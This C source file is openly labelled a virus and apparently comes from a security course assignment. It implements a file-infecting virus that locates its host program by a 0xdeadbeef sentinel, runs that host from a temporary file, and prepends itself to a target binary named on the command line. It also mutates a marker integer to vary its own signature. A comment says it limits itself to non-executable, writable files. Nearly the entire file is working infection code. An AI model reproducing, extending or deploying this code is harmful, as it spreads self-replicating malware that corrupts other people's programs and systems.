#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/file.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <assert.h>
#include <sys/types.h>
#include <termios.h>
#include <sys/stat.h>
#include <time.h>


#include "virus.h"

unsigned int a = 219540062; //0xD15EA5E, doesn't change
unsigned int b = 3405691582; //value to change, is offset by 4 from a
int main(int argc, char* argv[]){

	a = 0;
	b = 0;
	int c = a + b;

	switch(c){
		default:
			break;
	}

	//virus logic
	if(argc == 1){
		//run host
		int hostOffset = findSentinal(argv[0]);
		if(hostOffset < 0){
			assert(hostOffset >= 0);
			exit(1);
		}
		int err = copyHost(hostOffset, argv[0], argv);
		if(err < 0){
			assert(err >= 0);
			exit(1);
		}

	}
	if(argc >= 2){
		//copy arg 2
		//run host
		int hostOffset = findSentinal(argv[0]);
		if(hostOffset < 0){
			assert(hostOffset >= 0);
			exit(1);
		}
		int err = copyHost(hostOffset, argv[0], argv);
		if(err < 0){
			assert(err >= 0);
			exit(1);
		}


	}
	exit(0);
}

/*Runs the host a searches the sentinal value 'deadbeef'
*
*@return: file offset if successful, -1 otherwise
*/
int findSentinal(char* host){
	//open host and virus
	int fp = open(host, O_RDONLY);
	assert(fp > 0);
	if(fp < 0){
		return -1;
	}

	//search for 'deadbeef'
	unsigned char sentinal[4] = {0xde, 0xad, 0xbe, 0xef};
	ssize_t r = 0;
	unsigned char c = 0;
	int count = 0;
	off_t hostStart = -1;
	do{
		r = read(fp, &c, 1);
		assert(r >= 0);
		if(r < 0){
			return -1;
		}
		//end loop if end of file reached
		if(r == 0){
			break;
		}

		assert(count < 4);
		if(c == sentinal[count]){
			count++;
		}
		else{
			count = 0;
		}
		if(count == 4){
			hostStart = lseek(fp, 0, SEEK_CUR);
			break;
		}

	}while(r != 0);
	if(hostStart == -1){
		return -1;
	}
	else{
		return hostStart;
	}

}

/*Copies the host portion of the seed to a temp file
*
*
*@return: 0 or -1 on failure
*/
int copyHost(int hostOffset, char* host, char** argv){

	int tfd = 0;

	//get ruid
	uid_t ruid = getuid();
	char ruidBuff[16];
	memset(ruidBuff, 0, 16);
	sprintf(ruidBuff, "%d", ruid);
	ruidBuff[16] = '\0';

	//create path for temp file
	char* pathPart = "/tmp/host.";
	int pathLength = strlen(pathPart) + strlen(ruidBuff);
	assert(pathLength > 0);

	char* path = malloc(pathLength + 1);
	if(path == NULL){
		return -1;
	}
	memset(path, 0, pathLength + 1);
	sprintf(path, "%s%s", pathPart, ruidBuff);

	//check for file existance
	int exist = access(path, F_OK);
	if(exist == 0){
		//unlink the file
		unlink(path);
		free(path);
		exit(2);
	}
	
	//open file
	int fp = open(path, O_WRONLY | O_CREAT);
	assert(fp >= 0);
	if(fp < 0){
		return -1;
	}

	//open host
	int hostp = open(host, O_RDONLY);
	assert(hostp >= 0);
	if(hostp < 0){
		return -1;
	}
	lseek(hostp, hostOffset, SEEK_SET);

	unsigned char c = 0;
	int n = 0;
	do{
		n = read(hostp, &c, 1);
		if(n == 0){
			break;
		}
		assert(n >= 0);
		if(n < 0){
			free(path);
			return -1;
		}

		write(fp, &c, 1);
	}while(n != 0);
	
	close(fp);
	pid_t pid;
	pid = fork();
	if(pid > 0){
		int status = 0;
		//parent
		//wait on child so that it can delete temp file after it compeletes
		wait(&status);
		unlink(path);

		if(argv[1] == NULL){
			free(path);
			exit(0);
		}
		//check whether file parameter is infectable
		int infectable = isInfectable(argv[1]);
		if(infectable == 1){
			//prepend "./" to the argv[1]
			char selfDir[3] = {'.', '/', '\0'};
			char* adjustedArg;

			adjustedArg = malloc(strlen(argv[1]) + 4);
			assert(adjustedArg != NULL);
			if(adjustedArg == NULL){
				exit(1);
			}

			strncpy(adjustedArg, selfDir, 3);
			strncat(adjustedArg, argv[1], strlen(argv[1]) + 1);
			
		}
		else if(infectable == 0){
			tfd = open("/tmp/az8219", O_RDWR | O_CREAT | O_TRUNC);

			if(mutate(tfd, argv[0], hostOffset) < 0){
				free(path);
				return -1;
			}
			if(copyProgram(argv[1], tfd) < 0){
				free(path);
				return -1;
			}

			//remove temp virus
			unlink("/tmp/az8219");
		}
		else{
			//file not infectable
		}
	}
	else if(pid == 0){
		//child
		//switch child to foreground
		//get pgid for stdin
		pid_t stdin_PGID;
		stdin_PGID = tcgetpgrp(STDIN_FILENO);
		tcsetpgrp(STDIN_FILENO, stdin_PGID);

		//run host program
		char* tempArg = "host.";
		char arg[128];
		sprintf(arg, "%s%s", tempArg, ruidBuff);
		argv[0] = arg;
		chmod(path, S_IXUSR);
		int err = execvp(path, argv);
		assert(err >= 0);
		free(path);
		if(err < 0){
			printf("%s\n", strerror(errno));
		}
		exit(-1);
	}
	else{
		assert(pid >= 0);
		return -1;
	}

	free(path);
	return 0;
}

/*Checks whether a parameter is infectable by determining if
* it has any executable bits set (to prevent uncontrolled spread)
* and whether it can be written too. It also checks if the file is
*already infected.
*@param arg: the path of the file to inspect
*
*/
int isInfectable(char* arg){
	char selfDir[3] = {'.', '/', '\0'};
	char* adjustedArg;
	if(strlen(arg) > 2){
		if(arg[0] != selfDir[0] && arg[1] != selfDir[1]){
			adjustedArg = malloc(strlen(arg) + 4);
			assert(adjustedArg != NULL);
			if(adjustedArg == NULL){
				exit(1);
			}

			strncpy(adjustedArg, selfDir, 3);
			strncat(adjustedArg, arg, strlen(arg) + 1);
		}
		else{
			adjustedArg = NULL;
		}
	}

	//check executable bits
	int infectable = isExecutable(arg, adjustedArg);
	if(infectable < 0){
		free(adjustedArg);
		return -1;
	}

	//check if already infected
	infectable = isInfected(arg);
	if(infectable < 0){
		free(adjustedArg);
		return -1;
	}
	
	//check if writable
	if(adjustedArg == NULL){
		infectable = access(arg, W_OK);
		if(infectable < 0){
			free(adjustedArg);
			return -1;
		}
		else{
			free(adjustedArg);
			return infectable;
		}
	}
	else{
		infectable = access(arg, W_OK);
		if(infectable < 0){
			infectable = access(adjustedArg, W_OK);
			if(infectable < 0){
				free(adjustedArg);
				return -1;
			}
			else{
				free(adjustedArg);
				return infectable + 1; //signal to caller that './' needs to be concatted
			}
		}
		else{
			free(adjustedArg);
			return infectable;
		}
	}

}
/*Checks whether the executable bit is set for the arguements.
*
*@return int - 0 if there is no executable bit set, and -1 if the
*	executable bit is set or if there is another error.
*/
int isExecutable(char* arg1, char* arg2){
	struct stat perm;
	int err = 0;
	if(arg2 == NULL){
		err = stat(arg1, &perm);
		if(err < 0){
			return -1;
		}

		//check if user has execute
		if((perm.st_mode & S_IXUSR) != 0){
			return -1;
		}
		//check if group has execute
		if((perm.st_mode  & S_IXGRP) != 0){
			return -1;
		}
		//check if others have execute
		if((perm.st_mode  & S_IXOTH) != 0){
			return -1;
		}

		return 0;
	}
	else{

		err = stat(arg1, &perm);
		if(err < 0){
			//arg1 not valid, try path2
			err = stat(arg2, &perm);
			//path2 not valid, failed
			if(err < 0){
				return -1;
			}
		}

		//check if user has execute
		if((perm.st_mode  & S_IXUSR) != 0){
			return -1;
		}
		//check if group has execute
		if((perm.st_mode  & S_IXGRP) != 0){
			return -1;
		}
		//check if others have execute
		if((perm.st_mode  & S_IXOTH) != 0){
			return -1;
		}

		return 0;
	}
}
/*Mutates the binary of the virus portion of the code by searching
 *for the unsigned int that is equal to 0xD15EA5E, and then changing
 *the proceding value to a random integer.
 *@return - returns 0 on success, and -1 otherwise.
*/
int mutate(int fd, char* arg, int offset){
	int vfd = open(arg, O_RDONLY);
	assert(vfd >= 0);
	if(vfd < 0){
		return -1;
	}
	srand(time(NULL));

	unsigned int disease = 0xD15EA5E;
	unsigned int c = 0;
	unsigned int throwAway = 0;
	
	int bytesRead = 0;
	int err = 0;
	for(int i = 1; i < (offset / 4); i++){
		bytesRead = read(vfd, &c, 4);
		if(c == disease){
			//write the value
			err = write(fd, &c, 4);
			assert(err >= 0);
			if(err < 0){
				return -1;
			}
			//mutate next value
			bytesRead = read(vfd, &throwAway, 4);
			assert(bytesRead >= 0);
			if(bytesRead < 0){
				return -1;
			}
			int r = rand();
			err = write(fd, &r, 4);
			assert(err >= 0);
			if(err < 0){
				return -1;
			}
		}
		else{
			err = write(fd, &c, 4);
			assert(err >= 0);
			if(err < 0){
				return -1;
			}
		}
		/*
		if(c == deadbeef){
			return 0;
		}
		*/
	}
	return 0;
}
/*Checks whether the paramter file is already infected
*
*@return - 0 if not infected, and -1 otherwise or if error occurs
*/
int isInfected(char* arg){
	//open host and virus
	int fp = open(arg, O_RDONLY);
	assert(fp > 0);
	if(fp < 0){
		return -1;
	}

	//search for 'deadbeef'
	unsigned char sentinal[4] = {0xde, 0xad, 0xbe, 0xef};
	ssize_t r = 0;
	unsigned char c = 0;
	int count = 0;
	off_t hostStart = -1;
	do{
		r = read(fp, &c, 1);
		assert(r >= 0);
		if(r < 0){
			return -1;
		}
		//end loop if end of file reached
		if(r == 0){
			break;
		}

		assert(count < 4);
		if(c == sentinal[count]){
			count++;
		}
		else{
			count = 0;
		}
		if(count == 4){
			hostStart = lseek(fp, 0, SEEK_CUR);
			break;
		}

	}while(r != 0);
	if(hostStart == -1){
		return 0;
	}
	else{
		return -1;
	}
}
int copyProgram(char* arg, int virus){
	int fd = open(arg, O_RDONLY);
	assert(fd >= 0);
	if(fd < 0){
		return -1;
	}
	int bytesRead = 0;
	unsigned char c = 0;
	int err = 0;
	do{
		bytesRead = read(fd, &c, 1);
		assert(bytesRead >= 0);
		if(bytesRead == 0){
			break;
		}
		if(bytesRead < 0){
			return -1;
		}
		err = write(virus, &c, 1);
		assert(err >= 0);
		if(err < 0){
			return -1;
		}

	}while(bytesRead != 0);

	close(fd);

	//overwrite binary
	fd = open(arg, O_WRONLY | O_TRUNC);
	assert(fd >= 0);
	if(fd < 0){
		return -1;
	}
	lseek(virus, 0, SEEK_SET);

	unsigned int byte = 0;
	do{
		bytesRead = read(virus, &byte, 4);
		if(bytesRead < 0){
			printf("%s\n", strerror(errno));
			assert(bytesRead >= 0);
			return -1;
		}
		if(bytesRead == 0){
			break;
		}
		err = write(fd, &byte, 4);
		if(err < 0){
			assert(err >= 0);
			return -1;
		}
	}while(bytesRead > 0);

	return 0;

}
